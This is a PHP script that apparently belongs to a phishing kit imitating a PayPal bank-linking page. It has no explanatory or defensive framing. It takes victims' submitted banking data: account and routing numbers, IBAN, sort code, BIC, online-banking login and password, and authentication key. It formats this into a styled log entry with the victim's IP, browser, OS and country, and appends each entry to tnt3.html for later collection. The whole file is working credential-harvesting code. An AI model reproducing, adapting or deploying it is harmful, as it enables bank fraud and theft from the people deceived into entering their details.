<?

if (! ($_SERVER['REQUEST_METHOD'] === 'POST')) {
     exit;
}
	$date = $_POST['date'];
$_SESSION = $_POST['s'];

$content = "<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
  <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>

  <font style='color: rgb(251, 58, 105);'>PP BANK LOGIN :</font>
  <font style='color: rgb(20, 158, 27);'>Add Date CARD:</font> $date       

                                                                                                                                                                                                                                             
   <font style='color: rgb(128, 129, 131);'>&#10112; Bank Name   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['fullnameInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Account Type :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['accountTypechecking']."".$_POST['accountTypesavings']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Account Number :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['accountNumber']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Routing Number :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['routingNumber']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Transit :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['transit']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Institution :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['institution']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; BSB :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['BSB']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; First Name  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['firstName']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; IBAN  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['IBAN']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Sort Code  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['sortCode']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Security Number  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['secNum']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Issue Number  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['issNum']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Authentication Key  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['authkey']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Bank Code  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['BIC']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Bank Name  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['bankName']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Bank Login  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['bankLogin']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Bank Password  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['bankPass']."</font>
   
   
   <font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_LOOKUP_COUNTRY_']."</font>

   
   
   
   <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '../users/tnt4.html'>identity</a></font></br>
   <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_POST['REMOTE_ADDR']."'>".$_POST['REMOTE_ADDR']."</a></font><br> 
   <font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_POST['b']." On ".$_POST['os']."</font><br>
   
   ";




	
$f = fopen("tnt3.html", "a");
fwrite($f, $content);
		
fclose($f);




?>